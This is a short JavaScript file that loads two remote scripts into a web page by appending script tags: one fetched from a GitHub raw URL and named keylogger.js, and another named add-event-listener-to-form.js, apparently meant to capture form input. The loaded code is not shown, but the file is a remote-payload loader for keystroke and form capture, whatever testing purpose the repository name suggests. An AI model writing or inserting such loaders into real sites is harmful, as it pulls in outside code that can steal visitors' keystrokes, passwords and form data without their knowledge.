console.log("Main script loaded.");

function loadScript(url) {
    const script = document.createElement('script');
    script.src = url;
    script.onload = () => console.log(`Script loaded: ${url}`);
    document.head.appendChild(script);
}

// Load keylogger.js
loadScript('https://raw.githubusercontent.com/MiguelGomezMaxio/js-scrits-for-testing/main/keylogger.js');

// Load add-event-listener-to-form.js
loadScript('https://raw.githubusercontent.com/MiguelGomezMaxio/js-scrits-for-testing/main/add-event-listener-to-form.js');
